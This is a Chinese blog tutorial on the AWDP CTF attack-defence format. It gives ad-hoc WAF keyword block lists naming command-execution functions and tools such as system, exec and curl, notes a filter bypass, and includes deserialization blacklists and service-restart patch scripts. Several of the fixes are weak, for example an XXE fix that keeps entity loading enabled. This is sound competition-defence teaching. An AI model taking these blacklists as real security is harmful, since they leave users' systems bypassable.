---
title: "【AWDP】 AWDP 赛制详解&应对方法&赛题实践 量大管饱"
source: "https://jay17.blog.csdn.net/article/details/142147255?spm=1001.2014.3001.5502"
author:
  - "[[Jayjay___]]"
published: 2024-09-11
created: 2026-03-19
description: "文章浏览阅读1.6w次，点赞78次，收藏122次。【AWDP】 AWDP 赛制详解&应对方法&赛题实践 量大管饱_awdp"
tags:
  - "clippings"
---
文章首发于【先知社区】：https://xz.aliyun.com/t/15535

## 一、AWDP概述

### AWDP是什么

AWDP是一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式。每个参赛队互为攻击方和防守方，充分体现比赛的实战性、实时性和对抗性，对参赛队的渗透能力和防护能力进行综合全面的考量。

AWDP一般分为两个板块，Break（自己的payload打通）和Fix（让主办方的payload打不通）。通俗的讲，其实就是CTF+反CTF。

tips：Fix一般比Break容易，如果是同时进行的，优先Fix。如果不是同时进行的，Break时候建议思考Fix。

### 赛前准备工作

离线语言手册（或者utools）、安全文章库、各语言WAF

## 二、常见FIX手段

**通用** ：上WAF、注释漏洞语句

PHP特性：基本上不会出现，没有FIX的实际意义

SQL注入：上WAF、addslashes() 函数过滤、 预处理

SSTI：上WAF（SSTI只过滤 `{` 不行）

原型链污染：注释污染相关代码即可

文件上传：后缀强校验、文件内容WAF、MIMA头（最好一次都修上）

JAVA ： **注释** 、上调库版本、上WAF

代码审计：上WAF、注释漏洞代码

## 三、WAF写法

tips：

注意语法，本地自己测试一下。WAF语法错了一个都防不住，还容易error

平时做题遇到难的，把他waf存一下

### PHP

```php
$str1 ="";
foreach ($_POST as $key => $value) {
    $str1.=$key;
    $str1.=$value;
}
$str2 ="";
foreach ($_GET as $key => $value) {
    $str2.=$key;
    $str2.=$value;
}
if (preg_match("/system|tail|flag|\'|\"|\<|\{|\}|exec|base64|phpinfo|<\?|\"/i", $str1)||preg_match("/system|tail|flag|\'|\"|\<|\{|\}|exec|base64|phpinfo|<\?|\"/i", $str2)) {
    die('no!');
}
php12345678910111213
```
```php
//RCE
function wafrce($str){
    return !preg_match("/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i", $str);
}

//以下这个可以用短标签+反引号+通配符绕过过滤
preg_match("/\^|\||\~|assert|print|include|require|\(|echo|flag|data|php|glob|sys|phpinfo|POST|GET|REQUEST|exec|pcntl|popen|proc|socket|link|passthru|file|posix|ftp|\_|disk|tcp|cat|tac/i", $str);

//SQL
function wafsqli($str){
    return !preg_match("/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|>|<|;|\"|\'|\^|\|/i", $str);
}

if (preg_match("/select|flag|union|\\\\$|\'|\"|--|#|\\0|into|alert|img|prompt|set|/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\<|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\\`|sleep|benchmark|regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\&|\*|\.|/is",$s)||strlen($s)>50){
    header("Location: /");
    die();
  }

//XSS
function wafxss($str){
    return !preg_match("/\'|http|\"|\\`|cookie|<|>|script/i", $str);
}
php12345678910111213141516171819202122232425
```
```php
function wafrce($str){
    return !preg_match("/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i", $str);
}

function wafsqli($str){
    return !preg_match("/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|>|<|;|\"|\'|\^|\|/i", $str);
}

function wafxss($str){
    return !preg_match("/\'|http|\"|\\`|cookie|<|>|script/i", $str);
}

php123456789101112
```
```php
// fix后(XXE)
<?php
    function is_user_exists($username, $user_info_dir): bool
    {
        $dirs = array_filter(glob($user_info_dir . '/*'), 'is_dir');
        foreach ($dirs as $dir) {
            $dirName = basename($dir);
            if($dirName === $username) return true;

        }
        return false;
    }

    function register_user($username, $user_info_dir, $user_xml){
        $r = "/php|read|flag/i";
        $username = preg_replace($r,"",$username);
        $user_dir_name = $user_info_dir.$username;
        mkdir($user_dir_name, 0777);
        file_put_contents($user_dir_name.'/'.$username.".xml", $user_xml);
    }

    function get_user_record($username, $user_info_dir)
    {
        $r = "/php|read|flag/i";
        $username = preg_replace($r,"",$username);
        $user_info_xml = file_get_contents($user_info_dir.$username.'/'.$username.'.xml');
        $dom = new DOMDocument();
        $dom->loadXML($user_info_xml, LIBXML_NOENT | LIBXML_DTDLOAD);
        return simplexml_import_dom($dom);
    }
php123456789101112131415161718192021222324252627282930
```

### Go

这个写在漏洞点前面，然后input替换成我们需要检测正则的字符串即可。检测到就会return结束。但是下面的正则写法依赖strings库

```
import (
    "fmt"
    "strings"
)

func main() {
    var input string

    fmt.Print("请输入一个字符串：")
    fmt.Scanln(&input)

    maliciousStrings := []string{"union", "select", "delete", "insert", "update", "truncate", "drop", "create", "\"", "'", " ", "{{", "}}", ".","{","}","flag"}

    input = strings.ToLower(input) // 将输入转换为小写，便于匹配

    for _, s := range maliciousStrings {
        if strings.Contains(input, s) {
            return // 包含恶意字符串
        }
    }
go1234567891011121314151617181920
```

下面这个写法不依赖这个库。但是代码会多点。都是自己实现的功能

```
import (
    "fmt"
)

func main() {
    var input string

    fmt.Print("请输入一个字符串：")
    fmt.Scanln(&input)

    maliciousStrings := []string{"union", "select", "delete", "insert", "update", "truncate", "drop", "create", "\"", "'", " ", "{{", "}}", ".","{","}","flag"}

    if isMalicious(input, maliciousStrings) {
        return
    }
}

func isMalicious(input string, maliciousStrings []string) bool {
    input = stringToLower(input)

    for _, s := range maliciousStrings {
        if stringContains(input, s) {
            return true
        }
    }
    return false
}

func stringToLower(str string) string {
    runes := []rune(str)
    for i, r := range runes {
        if r >= 'A' && r <= 'Z' {
            runes[i] = r + ('a' - 'A')
        }
    }
    return string(runes)
}

func stringContains(str string, substr string) bool {
    strRunes := []rune(str)
    substrRunes := []rune(substr)

    for i := 0; i <= len(strRunes)-len(substrRunes); i++ {
        found := true
        for j := 0; j < len(substrRunes); j++ {
            if strRunes[i+j] != substrRunes[j] {
                found = false
                break
            }
        }
        if found {
            return true
        }
    }

    return false
}
go12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758
```

### Nodejs

把下面的 `input` 改成题目的可控输入点即可

```
const input = "awdwawdd";
const maliciousStrings = ["__proto__", "constructor", "prototype", "insert", "update", "truncate", "drop", "create", "\"", "'", " ", "{{", "}}","union", "select", "delete", "\"", "'", " ", "{{", "}}", ".","{","}","flag"];

function isMalicious(input, maliciousStrings) {
    input = input.toLowerCase();

    for (let i = 0; i < maliciousStrings.length; i++) {
        const pattern = new RegExp(maliciousStrings[i], "i");
        if (pattern.test(input)) {
            return true;
        }
    }

    return false;
}

if (isMalicious(input, maliciousStrings)) {
        console.log("输入参数包含恶意字符串");
} else {
    console.log("输入参数安全");
}
go123456789101112131415161718192021
```
```js
// fix后
app.get('/profile', function (req, res) {
    ...
    ...
    ...
    ...
    ...

    const blacklist = [
        "outputFunctionName", "__proto__", "return", "global", "process", "mainModule", "constructor", "child", "execSync","escapeFunction", "client", "compileDebug", "prototype"
    ]

    for (let i = 0; i < blacklist.length; i++) {
        if (data.includes(blacklist[i])){
            return res.status(400).render('error', { code: 400, msg: 'hack' });
        }
    }
js1234567891011121314151617
```

### Java

```java
import java.util.regex.Pattern;

public class MaliciousInputChecker {

    public static void main(String[] args) {
        String input = "SELECT * FROM users WHERE id = 1 OR 1=1";
  
    }

    public static boolean isMalicious(String input, String[] maliciousStrings) {
        input = input.toLowerCase();

        for (int i = 0; i < maliciousStrings.length; i++) {
            Pattern pattern = Pattern.compile(maliciousStrings[i], Pattern.CASE_INSENSITIVE);
            if (pattern.matcher(input).find()) {
                return true;
            }
        }

        return false;
    }

}
java1234567891011121314151617181920212223
```

### Python

```python
input_str ="awdawafaunonwdwa"

malicious_strings = ["__proto__", "constructor", "prototype", "insert", "update", "truncate", "drop", "create", "\"", "'", " ", "{{", "}}","union", "select", "delete", "\"", "'", " ", "{{", "}}", ".","{","}","flag"]

for s in malicious_strings:
    if input_str.lower().find(s) != -1:
        exit()
python1234567
```
```python
black_list = ["{{","}}", "'", '"', '_', '[','.','%','+','|','(',')','{','}','\\','/']
        for tmp in black_list:
            if tmp in v:
                raise ValueError("note cannot contain a special character")
python1234
```
```python
const keywords = ["flag", "exec", "read", "open", "ls", "cat"];

for (const i of keywords) {
    if (code.includes(i)) {
        result = "Hacker!"  
    }else{
        result = vm.run((code));
    }
}
python123456789
```
```python
# fix
@app.route("/", methods=["GET", "POST"])
def index():
    ip, port = re.findall(pattern,request.host).pop()
    if request.method == 'POST' and request.form.get("word"):
        word = request.form.get("word")
        black_list = ["{{","}}", "'", '"', '_', '[','.','%','+','|','(',')','{','}','\\','/','flag']
        for tmp in black_list:
            if tmp in word:
                word = "Hacker!"
        if not waf(word):
            word = "Hacker!"
    else:
        word = ""

    return render_template_string(content % (str(ip), str(port), str(word)))
python12345678910111213141516
```

### 正则表达式

==PHP==

![img](https://img-blog.csdnimg.cn/img_convert/524ca2c23cc12cbcdca844558e89f961.jpeg)

```
一、校验数字的表达式
数字：^[0-9]*$
n位的数字：^\d{n}$
至少n位的数字：^\d{n,}$
m-n位的数字：^\d{m,n}$
零和非零开头的数字：^(0|[1-9][0-9]*)$
非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]{1,2})?$
带1-2位小数的正数或负数：^(\-)?\d+(\.\d{1,2})?$
正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$
有两位小数的正实数：^[0-9]+(.[0-9]{2})?$
有1~3位小数的正实数：^[0-9]+(.[0-9]{1,3})?$
非零的正整数：^[1-9]\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\+?[1-9][0-9]*$
非零的负整数：^\-[1-9][]0-9"*$ 或 ^-[1-9]\d*$
非负整数：^\d+$ 或 ^[1-9]\d*|0$
非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$

二、校验字符的表达式
汉字：^[\u4e00-\u9fa5]{0,}$
英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$
长度为3-20的所有字符：^.{3,20}$
由26个英文字母组成的字符串：^[A-Za-z]+$
由26个大写英文字母组成的字符串：^[A-Z]+$
由26个小写英文字母组成的字符串：^[a-z]+$
由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$
由数字、26个英文字母或者下划线组成的字符串：^\w+$ 或 ^\w{3,20}$
中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0-9_]+$
中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$
可以输入含有^%&',;=?$\"等字符：[^%&',;=?$\x22]+
禁止输入含有~的字符：[^~\x22]+

三、特殊需求表达式
Email地址：^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$
域名：[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?
InternetURL：[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&=]*)?$
手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$
电话号码("XXX-XXXXXXX"、"XXXX-XXXXXXXX"、"XXX-XXXXXXX"、"XXX-XXXXXXXX"、"XXXXXXX"和"XXXXXXXX)：^(\(\d{3,4}-)|\d{3.4}-)?\d{7,8}$ 
国内电话号码(0511-4405222、021-87888822)：\d{3}-\d{8}|\d{4}-\d{7}
身份证号：
15或18位身份证：^\d{15}|\d{18}$
15位身份证：^[1-9]\d{7}((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])\d{3}$
18位身份证：^[1-9]\d{5}[1-9]\d{3}((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])\d{4}$
短身份证号码(数字、字母x结尾)：^([0-9]){7,18}(x|X)?$ 或 ^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$
帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$
密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\w{5,17}$
强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$ 
日期格式：^\d{4}-\d{1,2}-\d{1,2}
一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$
一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$ 
中文字符的正则表达式：[\u4e00-\u9fa5]
空白行的正则表达式：\n\s*\r (可以用来删除空白行)
HTML标记的正则表达式：<(\S*?)[^>]*>.*?</\1>|<.*? /> (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力)
首尾空白字符的正则表达式：^\s*|\s*$或(^\s*)|(\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)
腾讯QQ号：[1-9][0-9]{4,} (腾讯QQ号从10000开始)
中国邮政编码：[1-9]\d{5}(?!\d) (中国邮政编码为6位数字)
IP地址：\d+\.\d+\.\d+\.\d+ (提取IP地址时有用)
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455
```

==Python==

一般是用 `re` 模块

```
import re

# 检查字符串是否包含字母"a"
txt = "Hello, world!"
match = re.search("a", txt)
print(match)  # 输出：None，因为"a"没有在字符串中
123456
```

详细见本地下载的 `html` 文件

==Java==

```
\：将下一字符标记为特殊字符、文本、反向引用或八进制转义符。例如， n匹配字符 n。\n 匹配换行符。序列 \\\\ 匹配 \\ ，\\( 匹配 (。

^：匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与"\n"或"\r"之后的位置匹配。

$：匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与"\n"或"\r"之前的位置匹配。

①字符的取值范围

[abc] : 表示可能是a，可能是b，也可能是c。

[^abc]: 表示不是a,b,c中的任意一个

[a-zA-Z]: 表示是英文字母

[0-9]:表示是数字

②字符表示

.：匹配任意的字符，除了换行符。

\d：表示数字

\D：表示非数字

\s：表示由空格组成，[ \t\n\r\x\f]

\S：表示由非空字符组成，[^\s]

\w：表示字母、数字、下划线，[a-zA-Z0-9_]

\W：表示不是由字母、数字、下划线组成

\b：匹配一个字边界，即字与空格间的位置。例如，"er\b"匹配"never"中的"er"，但不匹配"verb"中的"er"。

\B：非字边界匹配。"er\B"匹配"verb"中的"er"，但不匹配"never"中的"er"。

③数量表达式

?: 表示出现0次或1次，同下+和*，跟在字母或者.点号后面。

+: 表示出现1次或多次

*: 表示出现0次、1次或多次

{n}：表示出现n次

{n,m}：表示出现n~m次

{n,}：表示出现n次或n次以上
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950
```
```
①校验数字的表达式

数字：^[0-9]*$

n位的数字：^\d{n}$

至少n位的数字：^\d{n,}$

m-n位的数字：^\d{m,n}$

零和非零开头的数字：^(0|[1-9][0-9]*)$

非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(\.[0-9]{1,2})?$

带1-2位小数的正数或负数：^(\-)?\d+(\.\d{1,2})$

正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$

有两位小数的正实数：^[0-9]+(\.[0-9]{2})?$

有1~3位小数的正实数：^[0-9]+(\.[0-9]{1,3})?$

非零的正整数：^[1-9]\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\+?[1-9][0-9]*$

非零的负整数：^\-[1-9][]0-9"*$ 或 ^-[1-9]\d*$

非负整数：^\d+$ 或 ^[1-9]\d*|0$

非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$

非负浮点数：^\d+(\.\d+)?$ 或 ^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$

非正浮点数：^((-\d+(\.\d+)?)|(0+(\.0+)?))$ 或 ^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$

正浮点数：^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$ 或 ^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$

负浮点数：^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$ 或 ^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$

浮点数：^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$

②校验字符的表达式

汉字：^[\u4e00-\u9fa5]{0,}$    //涉及到编码了

英文和数字：^[A-Za-z0-9]+$

长度为3-20的所有字符：^.{3,20}$

由26个英文字母组成的字符串：^[A-Za-z]+$

由26个大写英文字母组成的字符串：^[A-Z]+$

由26个小写英文字母组成的字符串：^[a-z]+$

由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$

由数字、26个英文字母或者下划线组成的字符串：^\w+$ 或 ^\w{3,20}$

中文、英文、数字包括下划线：^[\u4E00-\u9FA5A-Za-z0-9_]+$

中文、英文、数字但不包括下划线等符号：^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$

可以输入含有^%&',;=?$\"等字符：[^%&',;=?$\x22]+

禁止输入含有~的字符：[^~\x22]+

③真实实例

Email地址：^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$

域名：[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+\.?

InternetURL：[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&=]*)?$

手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|4|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$

电话号码：^(\(\d{3,4}-)|\d{3.4}-)?\d{7,8}$

国内电话号码：\d{3}-\d{8}|\d{4}-\d{7}

身份证号(15位、18位数字)，最后一位是校验位，可能为数字或字符X：(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)

帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$

密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\w{5,17}$

强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在 8-10 之间)：^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z0-9]{8,10}$

强密码(必须包含大小写字母和数字的组合，可以使用特殊字符，长度在8-10之间)：^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$

日期格式：^\d{4}-\d{1,2}-\d{1,2}

一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$

一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$

xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x|X][m|M][l|L]$

中文字符的正则表达式：[\u4e00-\u9fa5]

双字节字符：[^\x00-\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))

空白行的正则表达式：\n\s*\r (可以用来删除空白行)

HTML标记的正则表达式：<(\S*?)[^>]*>.*?|<.*? /> ( 首尾空白字符的正则表达式：^\s*|\s*$或(^\s*)|(\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)

腾讯QQ号：[1-9][0-9]{4,} (腾讯QQ号从10000开始)

中国邮政编码：[1-9]\d{5}(?!\d) (中国邮政编码为6位数字)

IP地址：((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))
————————————————
版权声明：本文为CSDN博主「Jay 17」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/Jayjay___/article/details/129827158
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114
```

==Nodejs==

略

==Go==

略

## 四、其他防御手段

### PHP

#### SQL注入

addslashes() 函数：

> addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。  
> 预定义字符是：
> 
> - 单引号（'）
> - 双引号（"）
> - 反斜杠（\\）
> - NULL
> 
> 该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。

```php
$username = $_GET['username'];
$password = $_GET['password'];

$username = addslashes($username);
$password = addslashes($password);

if (isset($_GET['username']) && isset($_GET['password'])) {
    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
php12345678
```

放到漏洞点的最前面

```php
foreach($_REQUEST as $key=>$value) {
    $_POST[$key] = addslashes($value);
    $_GET[$key] = addslashes($value);
    $_REQUEST[$key] = addslashes($value);
}
php12345
```

预编译（预处理）：

预处理算是sql里面的通防了。

原来源码：

```php
<?php
error_reporting(0);
include 'dbConnect.php';
$username = $_GET['username'];
$password = $_GET['password'];
if (isset($_GET['username']) && isset($_GET['password'])) {
    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    $result = $mysqli->query($sql);
    if (!$result)
        die(mysqli_error($mysqli));
    $data = $result->fetch_all(); // 从结果集中获取所有数据
    if (!empty($data)) {
        echo '登录成功！';
    } else {
        echo "用户名或密码错误";
    }
}
?>
php123456789101112131415161718
```

**mysql 预处理** （来自amiaaaz师傅的博客）

![image-20230904170602985](https://img-blog.csdnimg.cn/img_convert/ed9db68dd4302c4798717e8c47b70844.png)

**PDO 预处理** （来自amiaaaz师傅的博客）

![image-20230904170623933](https://img-blog.csdnimg.cn/img_convert/952ce8f2976c9ea89b8f65e8710351e2.png)

#### .htaccess

——来自chu0✌

完全禁止访问

可能会被判宕机

```xml
<IfModule mod_rewrite.c>
deny from all
</IfModule>
xml123
```

禁止访问以ph开头的文件

```xml
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule \.ph.*$ - [F]
</IfModule>
xml1234
```

防某固定文件访问，可以用来防不死马，直接403

```xml
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule ^\.index\.php$ - [F]
</IfModule>
xml1234
```

#### thinkphp框架防护

把这个waf直接上到public/index.php最前面

可以防住所有的tp框架漏洞

```php
foreach($_REQUEST as $key=>$value) {
    $_POST[$key] = preg_replace("/construct|get|call_user_func|load|invokefunction|Session|phpinfo|param1|Runtime|assert|input|dump|checkcode|union|select|updatexml|@/i",'',$value);
    $_GET[$key] = preg_replace("/construct|get|call_user_func|load|invokefunction|Session|phpinfo|param1|Runtime|assert|input|dump|checkcode|union|select|updatexml|@/i",'',$value);
}
php1234
```

### Java

#### 文件上传

在文件夹下上传monitor-Go，用下面的命令运行

```
./monitor-Go
1
```

#### 命令黑 名单

```java
String a = "123";
String[] blacklist = {"Runtime","\\u","exec","\"","+","'","","(",")","\\","<",">"};
for(int i = 0; i<blacklist.length; i++){
    if(a.contains(blacklist[i])){
throw new Exception("");
    }
}
java1234567
```

#### 反序列化

```java
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.util.HashSet;
import java.util.Set;

public class NewObjectInputStream extends ObjectInputStream {
    private static final Set<String> BLACKLISTED_CLASSES = new HashSet();

    static {
        BLACKLISTED_CLASSES.add("java.lang.Runtime");
        BLACKLISTED_CLASSES.add("java.lang.ProcessBuilder");
        BLACKLISTED_CLASSES.add("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        BLACKLISTED_CLASSES.add("java.security.SignedObject");
//        BLACKLISTED_CLASSES.add("com.sun.jndi.ldap.LdapAttribute");
//        BLACKLISTED_CLASSES.add("org.apache.commons.collections.functors.InvokerTransformer");
//        BLACKLISTED_CLASSES.add("org.apache.commons.collections.map.LazyMap");
//        BLACKLISTED_CLASSES.add("org.apache.commons.collections4.functors.InvokerTransformer");
//        BLACKLISTED_CLASSES.add("org.apache.commons.collections4.map.LazyMap");
//        BLACKLISTED_CLASSES.add("javax.management.BadAttributeValueExpException");
    }

    public NewObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    @Override // java.io.ObjectInputStream
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (BLACKLISTED_CLASSES.contains(desc.getName())) {
            throw new SecurityException("");
        }
        return super.resolveClass(desc);
    }
}
java1234567891011121314151617181920212223242526272829303132333435
```

#### 不断网防御法

不断网时候，遇到java，直接在 `pom.xml` 里面升级版本，全部往上调。

![image-20230905160309531](https://img-blog.csdnimg.cn/img_convert/a9fc7ad3d6d1b039904692a449597208.png)

```
fastjson版本修复用1.2.68（autoType绕过）
1
```

还有一种办法就是下载maven，外加做了那么多java题，依赖肯定不少

class文件编译后，直接拖进jar包替换

### Nodejs

可以尝试merge的参数改成白名单，只能传入admin。（emmm，好一个奇技淫巧）

#### 黑名单过滤

```java
const blacklist = ['exec','\'','"','.','(',')',',']

const a = "123"

for (const pattern of blacklist){
    if(pattern.includes(a)){
        throw new Error(\`\`);
    }
}
java123456789
```

### Python

#### sql注入

```python
conn = sqlite3.connect('db.sqlite3')
cursor = conn.cursor()
cursor.execute("INSERT INTO sys_users (username, password, role) VALUES ( ? , ? , ? )", (username, password, role))
python123
```
```python
content = ''

blacklist = ['\'','union','\"','select','(',')',',',' ','%']
for i in blacklist:
    if i in content.lower():
        exit()
python123456
```

#### 黑名单过滤

```python
content = ''

blacklist = ['\'','exec','\"','os','open','system','import','_','\\u','doc']
for i in blacklist:
    if i in content.lower():
        exit()
python123456
```

## 五、安恒AWDP

历史比赛：羊城杯2023、楚慧杯2024、CISCN2024华东南

赛制概述：Break、Fix分开来的。连上SSH自己修改代码，一小时Check一次，统一检查选手修复情况，比较刺激。

经验之谈：一共五题，会比初赛简单，AK完全有可能。五题一般为签到、文件上传、代码审计、Python漏洞、压轴题。其中签到、文件上传都是能秒了的。文件上传修复点可能有多个。

检测状态分为

- 通过
- 未通过（不告诉具体原因）

第一轮修出3个基本上拿个证书就稳了

## 六、永信至诚AWDP

历史比赛：CISCN2023、春秋杯夏季赛（打的不多，出题习惯没摸透）

### 赛制概述

Fix给15-20次机会，随选手什么时候用都行。一般是上传一个压缩文件包（patch包）…

检测状态分为

- exp利用成功
- 检测/运行异常
- 防御成功

造成 `服务检测异常` 可能是由以下两点造成的

- 过滤了正常流量中的某些字符或符号，导致正常服务出现错误。
- 页面返回的结果要符合逻辑，比如本来需要返回 `hacker` 的，经过过滤后，不能让他返回 `error` ，也需要返回 `hacker` 。因此，这里只能把一些关键的字符以及符号过滤了

### 注意事项

**patch包(.sh)**

要确保 `patch.sh` / `update.sh` 有效并且可以重置进程。

如果题目是直接给出了 `patch.sh` 的示例，我们只需要修改对应的文件名即可

```sh
# 题目给出的示例
ps -ef | grep python | grep -v grep | awk '{print $2}' | xargs kill -9
mv -f XXX.py /onlinenotepad1452/XXX.py
cd /onlinenotepad1452/ && python XXX.py
sh1234
```
```sh
# 修改后的结果
ps -ef | grep python | grep -v grep | awk '{print $2}' | xargs kill -9
mv -f main.py /onlinenotepad1452/main.py
cd /onlinenotepad1452/ && python main.py
sh1234
```

**patch包示例**

php

```sh
#!/bin/bash

cp /index.php /var/www/html/index.php
sh123
```

Python

```sh
#!/bin/sh

cp /app.py /app/app.py
ps -ef | grep python | grep -v grep | awk '{print $2}' | xargs kill -9 
cd /app && nohup python app.py  >> /opt/app.log 2>&1 &
sh12345
```

Go

```sh
#!/bin/bash

kill -9 $(pidof app)
cp ezgo_patch /app
chmod +x /app
/app 2>&1 >/dev/null &
sh123456
```

Nodejs

```sh
#!/bin/sh

cp server.js /app/server.js
ps -ef | grep node | grep -v grep | awk '{print $2}' | xargs kill -9 
cd /app && nohup node server.js  >> /opt/aa.log 2>&1 &
sh12345
```

---

修改文件：

```sh
mv -f explorer.php  /www/html/

//防止目录未知
mv -f explorer.php $(dirname \`find / -name 'explorer.php' 2>/dev/null\`)/explorer.php
sh1234
```

**打包**

可以通过Linux中的命令打包，格式一般会要求`.tar.gz` 的形式

```
tar -zcvf patch.tar.gz main.py patch.sh
1
```

**杀线程**

用ps去找进程然后kill掉（JavaScript）

```
ps -ef|grep npm|grep -v grep |awk '{print $2}'|xargs kill -9
ps -ef|grep node|grep -v grep |awk '{print $2}'|xargs kill -9
12
```

根据目录杀线程

```
ps -ef|grep app|grep -v grep |awk '{print $2}'|xargs kill -9
1
```

**小tips**

